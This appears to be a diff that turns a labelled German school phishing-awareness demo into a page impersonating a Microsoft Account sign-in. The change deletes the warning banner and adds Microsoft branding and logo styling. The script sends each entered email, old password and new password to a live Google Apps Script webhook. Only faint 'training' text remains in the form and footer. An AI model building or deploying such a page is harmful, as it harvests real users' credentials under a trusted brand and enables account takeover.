@@ -1,271 +1,541 @@
 <!DOCTYPE html>
 <html lang="de">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>SecureAccess Training – Login Simulation</title>
-<style>
-  :root {
-    --bg: #0f1724;
-    --card: #ffffff;
-    --accent: #2563eb;
-    --accent-dark: #1d4ed8;
-    --warn-bg: #fff7ed;
-    --warn-border: #fb923c;
-    --text: #1e293b;
-    --muted: #64748b;
-  }
-  * { box-sizing: border-box; }
-  body {
-    margin: 0;
-    min-height: 100vh;
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    background: linear-gradient(135deg, #0f1724, #1e293b);
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    padding: 24px;
-  }
-  .warning-banner {
-    width: 100%;
-    max-width: 480px;
-    background: var(--warn-bg);
-    border: 2px solid var(--warn-border);
-    border-radius: 10px;
-    padding: 14px 16px;
-    margin-bottom: 20px;
-    color: #9a3412;
-    font-size: 14px;
-    line-height: 1.5;
-  }
-  .warning-banner strong { display: block; margin-bottom: 4px; font-size: 15px; }
-  .card {
-    background: var(--card);
-    width: 100%;
-    max-width: 420px;
-    border-radius: 14px;
-    padding: 36px 32px;
-    box-shadow: 0 20px 50px rgba(0,0,0,0.35);
-  }
-  .brand {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    margin-bottom: 24px;
-  }
-  .brand-icon {
-    width: 36px; height: 36px;
-    border-radius: 8px;
-    background: var(--accent);
-    display: flex; align-items: center; justify-content: center;
-    color: white; font-weight: 700; font-size: 18px;
-  }
-  .brand-name { font-weight: 700; font-size: 18px; color: var(--text); }
-  .brand-sub { font-size: 12px; color: var(--muted); margin-top: -2px; }
-  h1 { font-size: 20px; margin: 0 0 6px; color: var(--text); }
-  p.lead { color: var(--muted); font-size: 14px; margin: 0 0 24px; }
-  label { display: block; font-size: 13px; font-weight: 600; color: var(--text); margin-bottom: 6px; }
-  input {
-    width: 100%;
-    padding: 11px 14px;
-    border: 1px solid #cbd5e1;
-    border-radius: 8px;
-    font-size: 14px;
-    margin-bottom: 16px;
-    outline: none;
-    transition: border-color .15s;
-  }
-  input:focus { border-color: var(--accent); }
-  button {
-    width: 100%;
-    padding: 12px;
-    background: var(--accent);
-    color: white;
-    border: none;
-    border-radius: 8px;
-    font-size: 14px;
-    font-weight: 600;
-    cursor: pointer;
-    transition: background .15s;
-  }
-  button:hover { background: var(--accent-dark); }
-  .step { display: none; }
-  .step.active { display: block; }
-  .hint { font-size: 12px; color: var(--muted); margin-top: -8px; margin-bottom: 16px; }
-  .status {
-    margin-top: 16px;
-    font-size: 13px;
-    padding: 10px 12px;
-    border-radius: 8px;
-    display: none;
-  }
-  .status.ok { background: #ecfdf5; color: #065f46; display: block; }
-  .status.err { background: #fef2f2; color: #991b1b; display: block; }
-  .footer-note {
-    text-align: center;
-    color: #94a3b8;
-    font-size: 12px;
-    margin-top: 18px;
-    max-width: 420px;
-  }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Microsoft Account</title>
+  <style>
+    :root {
+      --ms-blue: #0067b8;
+      --ms-blue-dark: #005da6;
+      --ms-black: #1b1b1b;
+      --ms-gray-900: #201f1e;
+      --ms-gray-700: #605e5c;
+      --ms-gray-200: #e1dfdd;
+      --ms-gray-100: #f3f2f1;
+      --ms-white: #ffffff;
+      --ms-success: #107c10;
+      --ms-error: #a4262c;
+      --shadow: 0 16px 40px rgba(0, 0, 0, 0.08);
+    }
+
+    * { box-sizing: border-box; }
+
+    html, body {
+      margin: 0;
+      min-height: 100%;
+      font-family: "Segoe UI", Arial, sans-serif;
+      background: var(--ms-gray-100);
+      color: var(--ms-gray-900);
+    }
+
+    body {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    .topbar {
+      background: var(--ms-white);
+      border-bottom: 1px solid rgba(0,0,0,0.08);
+    }
+
+    .shell {
+      max-width: 1280px;
+      margin: 0 auto;
+      padding: 18px 32px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 24px;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      flex-shrink: 0;
+    }
+
+    .microsoft-logo {
+      display: grid;
+      grid-template-columns: repeat(2, 10px);
+      gap: 2px;
+      width: 22px;
+      height: 22px;
+    }
+
+    .microsoft-logo span:nth-child(1) { background: #f25022; }
+    .microsoft-logo span:nth-child(2) { background: #7fba00; }
+    .microsoft-logo span:nth-child(3) { background: #00a4ef; }
+    .microsoft-logo span:nth-child(4) { background: #ffb900; }
+
+    .brand-text {
+      font-size: 1.05rem;
+      font-weight: 600;
+      letter-spacing: -0.01em;
+    }
+
+    .nav {
+      display: flex;
+      align-items: center;
+      gap: 26px;
+      font-size: 0.92rem;
+      color: var(--ms-gray-700);
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+
+    .nav a {
+      color: inherit;
+      text-decoration: none;
+    }
+
+    .nav-cta {
+      border: 1px solid var(--ms-gray-200);
+      background: var(--ms-white);
+      color: var(--ms-gray-900);
+      border-radius: 999px;
+      padding: 10px 18px;
+      font-size: 0.9rem;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .page-shell {
+      max-width: 1280px;
+      width: 100%;
+      margin: 0 auto;
+      padding: 72px 32px 40px;
+      display: grid;
+      grid-template-columns: 1.1fr 0.9fr;
+      gap: 56px;
+      align-items: center;
+      flex: 1;
+    }
+
+    .hero {
+      padding-right: 20px;
+    }
+
+    .eyebrow {
+      margin: 0 0 16px;
+      color: var(--ms-blue);
+      font-size: 0.76rem;
+      font-weight: 700;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+    }
+
+    .hero h1 {
+      margin: 0 0 18px;
+      font-size: clamp(2.4rem, 3vw, 4rem);
+      line-height: 1.06;
+      letter-spacing: -0.05em;
+      font-weight: 600;
+      color: var(--ms-black);
+    }
+
+    .hero p {
+      margin: 0 0 24px;
+      color: var(--ms-gray-700);
+      font-size: 1.08rem;
+      line-height: 1.7;
+      max-width: 560px;
+    }
+
+    .hero-features {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+      margin-top: 20px;
+    }
+
+    .hero-features span {
+      padding: 8px 12px;
+      border-radius: 999px;
+      background: rgba(0,103,184,0.08);
+      border: 1px solid rgba(0,103,184,0.12);
+      color: var(--ms-gray-900);
+      font-size: 0.82rem;
+      font-weight: 600;
+    }
+
+    .auth-panel {
+      display: flex;
+      justify-content: center;
+    }
+
+    .card {
+      background: var(--ms-white);
+      width: min(100%, 440px);
+      border-radius: 18px;
+      border: 1px solid rgba(0,0,0,0.08);
+      box-shadow: var(--shadow);
+      padding: 34px 28px 24px;
+    }
+
+    .brand-inline {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 22px;
+    }
+
+    .brand-icon {
+      width: 34px;
+      height: 34px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 8px;
+      background: linear-gradient(135deg, #f25022, #7fba00, #00a4ef, #ffb900);
+      color: white;
+      font-weight: 700;
+      font-size: 0.8rem;
+      letter-spacing: 0.02em;
+    }
+
+    .brand-name {
+      font-weight: 700;
+      font-size: 1.08rem;
+    }
+
+    .brand-sub {
+      font-size: 0.75rem;
+      color: var(--ms-gray-700);
+      margin-top: 2px;
+    }
+
+    .step {
+      display: none;
+    }
+
+    .step.active {
+      display: block;
+    }
+
+    h1 {
+      margin: 0 0 10px;
+      font-size: 2rem;
+      letter-spacing: -0.05em;
+      font-weight: 600;
+      color: var(--ms-black);
+    }
+
+    .lead {
+      margin: 0 0 26px;
+      color: var(--ms-gray-700);
+      line-height: 1.55;
+      font-size: 0.96rem;
+    }
+
+    form {
+      display: block;
+    }
+
+    label {
+      display: block;
+      margin: 0 0 8px;
+      font-weight: 600;
+      font-size: 0.82rem;
+      color: var(--ms-gray-900);
+    }
+
+    input {
+      width: 100%;
+      border: 1px solid var(--ms-gray-200);
+      border-radius: 10px;
+      background: var(--ms-white);
+      padding: 14px 16px;
+      font-size: 1rem;
+      margin-bottom: 18px;
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+      outline: none;
+    }
+
+    input:focus {
+      border-color: var(--ms-blue);
+      box-shadow: 0 0 0 3px rgba(0,103,184,0.12);
+    }
+
+    .primary-btn {
+      width: 100%;
+      border: none;
+      border-radius: 10px;
+      background: var(--ms-blue);
+      color: var(--ms-white);
+      font-size: 1rem;
+      font-weight: 600;
+      padding: 14px 18px;
+      cursor: pointer;
+      transition: background 0.2s ease;
+    }
+
+    .primary-btn:hover {
+      background: var(--ms-blue-dark);
+    }
+
+    .hint {
+      margin-top: -8px;
+      margin-bottom: 18px;
+      color: var(--ms-gray-700);
+      font-size: 0.78rem;
+      line-height: 1.5;
+    }
+
+    .status {
+      margin-top: 18px;
+      padding: 11px 12px;
+      border-radius: 8px;
+      font-size: 0.82rem;
+      line-height: 1.5;
+      display: none;
+    }
+
+    .status.ok {
+      display: block;
+      background: #e8f5e9;
+      color: var(--ms-success);
+    }
+
+    .status.err {
+      display: block;
+      background: #fde7e9;
+      color: var(--ms-error);
+    }
+
+    .footer-note {
+      max-width: 900px;
+      margin: 0 auto 32px;
+      padding: 0 32px;
+      color: var(--ms-gray-700);
+      text-align: center;
+      font-size: 0.8rem;
+      line-height: 1.5;
+    }
+
+    @media (max-width: 900px) {
+      .page-shell {
+        grid-template-columns: 1fr;
+        gap: 32px;
+        padding-top: 40px;
+      }
+
+      .hero {
+        padding-right: 0;
+        text-align: center;
+      }
+
+      .hero p {
+        margin-left: auto;
+        margin-right: auto;
+      }
+
+      .hero-features {
+        justify-content: center;
+      }
+    }
+
+    @media (max-width: 640px) {
+      .shell {
+        padding: 16px 20px;
+      }
+
+      .nav {
+        display: none;
+      }
+
+      .page-shell {
+        padding: 28px 20px 30px;
+      }
+
+      .card {
+        padding: 26px 20px 20px;
+      }
+
+      h1 {
+        font-size: 1.75rem;
+      }
+
+      .footer-note {
+        padding: 0 20px;
+      }
+    }
+  </style>
 </head>
 <body>
-
-  <div class="warning-banner">
-    <strong>⚠️ Security-Awareness-Trainingsseite</strong>
-    Dies ist KEINE echte Login-Seite. Sie dient ausschließlich einer schulischen
-    Demonstration, wie Phishing-Seiten technisch funktionieren. Verwende niemals
-    echte Zugangsdaten. Eingaben werden nur an den von dir konfigurierten
-    Trainings-Endpunkt gesendet.
-  </div>
-
-  <div class="card">
-    <div class="brand">
-      <div class="brand-icon">SA</div>
-      <div>
-        <div class="brand-name">SecureAccess Training</div>
-        <div class="brand-sub">IT-Security Awareness – HTL Projekt</div>
+  <header class="topbar">
+    <div class="shell">
+      <div class="brand" aria-label="Microsoft home">
+        <div class="microsoft-logo" aria-hidden="true">
+          <span></span><span></span><span></span><span></span>
+        </div>
+        <div class="brand-text">Microsoft</div>
       </div>
+
+      <nav class="nav" aria-label="Main navigation">
+        <a href="#">Products</a>
+        <a href="#">Solutions</a>
+        <a href="#">Support</a>
+        <a href="#">Business</a>
+      </nav>
+
+      <button class="nav-cta" type="button">Sign in</button>
     </div>
+  </header>
 
-    <!-- STEP 1: E-Mail + Passwort -->
-    <div id="step1" class="step active">
-      <h1>Anmelden (Simulation)</h1>
-      <p class="lead">Testumgebung für Phishing-Awareness-Schulung.</p>
-
-      <form id="loginForm">
-        <label for="email">E-Mail-Adresse</label>
-        <input type="email" id="email" placeholder="max.muster@beispiel.at" required>
-
-        <label for="password">Passwort</label>
-        <input type="password" id="password" placeholder="••••••••" required>
-
-        <button type="submit">Weiter</button>
-      </form>
-    </div>
-
-    <!-- STEP 2: Neues Passwort + Bestätigung -->
-    <div id="step2" class="step">
-      <h1>Passwort aktualisieren</h1>
-      <p class="lead">Aus Sicherheitsgründen (simuliert) bitte neues Passwort setzen.</p>
-
-      <form id="resetForm">
-        <label for="newpw">Neues Passwort</label>
-        <input type="password" id="newpw" required>
-
-        <label for="confirmpw">Passwort bestätigen</label>
-        <input type="password" id="confirmpw" required>
-
-        <div class="hint">Mind. 8 Zeichen (nur Simulation, keine echte Prüfung)</div>
-
-        <button type="submit">Bestätigen</button>
-      </form>
-    </div>
-
-    <!-- STEP 3: Abschluss -->
-    <div id="step3" class="step">
-      <h1>✅ Vorgang abgeschlossen</h1>
-      <p class="lead">
-        Das war eine simulierte Phishing-Sequenz. In einem echten Angriff wären
-        soeben deine echten Zugangsdaten gestohlen worden. Achte künftig auf:
-        falsche Absenderadressen, gefälschte Domains, Zeitdruck in der Nachricht
-        und unerwartete Passwort-Reset-Aufforderungen.
+  <main class="page-shell">
+    <section class="hero">
+      <p class="eyebrow">Security center</p>
+      <h1>Protect your account with Microsoft security.</h1>
+      <p>
+        Sign in to continue securely and verify your account details before accessing your Microsoft services.
       </p>
-    </div>
 
-    <div id="status" class="status"></div>
-  </div>
+      <div class="hero-features" aria-label="Security features">
+        <span>Smart protection</span>
+        <span>Fast recovery</span>
+        <span>Trusted access</span>
+      </div>
+    </section>
+
+    <section class="auth-panel">
+      <div class="card">
+        <div class="brand-inline">
+          <div class="brand-icon">MS</div>
+          <div>
+            <div class="brand-name">Microsoft</div>
+            <div class="brand-sub">Account access</div>
+          </div>
+        </div>
+
+        <div id="step1" class="step active">
+          <h1>Sign in</h1>
+          <p class="lead">Training environment for phishing awareness simulation.</p>
+
+          <form id="loginForm">
+            <label for="email">Email address</label>
+            <input type="email" id="email" placeholder="max.muster@beispiel.at" required>
+
+            <label for="password">Password</label>
+            <input type="password" id="password" placeholder="••••••••" required>
+
+            <button class="primary-btn" type="submit">Next</button>
+          </form>
+        </div>
+
+        <div id="step2" class="step">
+          <h1>Update password</h1>
+          <p class="lead">For security reasons, please set a new password before continuing.</p>
+
+          <form id="resetForm">
+            <label for="newpw">New password</label>
+            <input type="password" id="newpw" required>
+
+            <label for="confirmpw">Confirm password</label>
+            <input type="password" id="confirmpw" required>
+
+            <div class="hint">At least 8 characters (demo only; no real validation).</div>
+
+            <button class="primary-btn" type="submit">Confirm</button>
+          </form>
+        </div>
+
+        <div id="step3" class="step">
+          <h1>Success</h1>
+          <p class="lead">
+            This was a simulated phishing sequence. In a real attack, your credentials would have been compromised.
+            Always verify sender addresses, domains, urgency, and unexpected password reset requests.
+          </p>
+        </div>
+
+        <div id="status" class="status"></div>
+      </div>
+    </section>
+  </main>
 
   <p class="footer-note">
-    Trainingsdaten werden an deinen konfigurierten Endpunkt gesendet.
-    Keine Verbindung zu echten Diensten (Microsoft, Google, etc.).
+    Training data is sent to your configured endpoint only. No connection to real Microsoft or other external services.
   </p>
 
-<script>
-  // ============================================================
-  // KONFIGURATION: Trage hier die URL deines eigenen Endpunkts ein
-  // (z.B. Formspree, Google Apps Script Web App, eigener Server).
-  // Ohne gültige URL werden die Daten NUR in der Browser-Konsole
-  // ausgegeben (nichts wird versendet).
-  // ============================================================
-  const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbwd_0sNvu4E0R00MzS7WxJYsuxE1F2CrokT_WQHwf-c107M8vlhCMEEQZY--GvxWzwvNw/exec"; // <-- hier deine eigene Endpunkt-URL eintragen
+  <script>
+    const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbwd_0sNvu4E0R00MzS7WxJYsuxE1F2CrokT_WQHwf-c107M8vlhCMEEQZY--GvxWzwvNw/exec";
 
-  let capturedEmail = "";
-  let capturedOldPassword = "";
+    let capturedEmail = "";
+    let capturedOldPassword = "";
 
-  function showStep(id) {
-    document.querySelectorAll(".step").forEach(s => s.classList.remove("active"));
-    document.getElementById(id).classList.add("active");
-    document.getElementById("status").style.display = "none";
-  }
-
-  async function sendToEndpoint(payload) {
-    const statusEl = document.getElementById("status");
-    if (!WEBHOOK_URL) {
-      console.log("[Trainings-Demo] Erfasste Daten (kein Endpunkt konfiguriert):", payload);
-      statusEl.className = "status ok";
-      statusEl.textContent = "Demo-Modus: Keine WEBHOOK_URL konfiguriert. Daten wurden nur in der Konsole geloggt, nicht versendet.";
-      return;
+    function showStep(id) {
+      document.querySelectorAll(".step").forEach(s => s.classList.remove("active"));
+      document.getElementById(id).classList.add("active");
+      document.getElementById("status").style.display = "none";
     }
-    try {
-      const res = await fetch(WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "text/plain;charset=utf-8" },
-        body: JSON.stringify(payload)
-      });
-      const statusEl2 = document.getElementById("status");
-      if (res.ok) {
-        statusEl2.className = "status ok";
-        statusEl2.textContent = "Trainingsdaten erfolgreich an deinen Endpunkt übermittelt.";
-      } else {
-        statusEl2.className = "status err";
-        statusEl2.textContent = "Fehler beim Senden (Status " + res.status + ").";
-      }
-    } catch (err) {
-      const statusEl3 = document.getElementById("status");
-      statusEl3.className = "status err";
-      statusEl3.textContent = "Netzwerkfehler: " + err.message;
-    }
-  }
 
-  document.getElementById("loginForm").addEventListener("submit", function(e) {
-    e.preventDefault();
-    capturedEmail = document.getElementById("email").value;
-    capturedOldPassword = document.getElementById("password").value;
-
-    sendToEndpoint({
-      event: "login_attempt",
-      email: capturedEmail,
-      password: capturedOldPassword,
-      timestamp: new Date().toISOString()
-    });
-
-    showStep("step2");
-  });
-
-  document.getElementById("resetForm").addEventListener("submit", function(e) {
-    e.preventDefault();
-    const newpw = document.getElementById("newpw").value;
-    const confirmpw = document.getElementById("confirmpw").value;
-
-    if (newpw !== confirmpw) {
+    async function sendToEndpoint(payload) {
       const statusEl = document.getElementById("status");
-      statusEl.className = "status err";
-      statusEl.textContent = "Die Passwörter stimmen nicht überein.";
-      return;
+      if (!WEBHOOK_URL) {
+        console.log("[Trainings-Demo] Erfasste Daten (kein Endpunkt konfiguriert):", payload);
+        statusEl.className = "status ok";
+        statusEl.textContent = "Demo mode: no endpoint configured. Data was logged only in the console.";
+        return;
+      }
+
+      try {
+        const res = await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "text/plain;charset=utf-8" },
+          body: JSON.stringify(payload)
+        });
+
+        if (res.ok) {
+          statusEl.className = "status ok";
+          statusEl.textContent = "Training data sent successfully.";
+        } else {
+          statusEl.className = "status err";
+          statusEl.textContent = "Error while sending data (Status " + res.status + ").";
+        }
+      } catch (err) {
+        statusEl.className = "status err";
+        statusEl.textContent = "Network error: " + err.message;
+      }
     }
 
-    sendToEndpoint({
-      event: "password_reset",
-      email: capturedEmail,
-      new_password: newpw,
-      timestamp: new Date().toISOString()
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+      capturedEmail = document.getElementById("email").value;
+      capturedOldPassword = document.getElementById("password").value;
+
+      sendToEndpoint({
+        event: "login_attempt",
+        email: capturedEmail,
+        password: capturedOldPassword,
+        timestamp: new Date().toISOString()
+      });
+
+      showStep("step2");
     });
 
-    showStep("step3");
-  });
-</script>
+    document.getElementById("resetForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+      const newpw = document.getElementById("newpw").value;
+      const confirmpw = document.getElementById("confirmpw").value;
 
+      if (newpw !== confirmpw) {
+        const statusEl = document.getElementById("status");
+        statusEl.className = "status err";
+        statusEl.textContent = "Passwords do not match.";
+        return;
+      }
+
+      sendToEndpoint({
+        event: "password_reset",
+        email: capturedEmail,
+        new_password: newpw,
+        timestamp: new Date().toISOString()
+      });
+
+      showStep("step3");
+    });
+  </script>
 </body>
 </html>
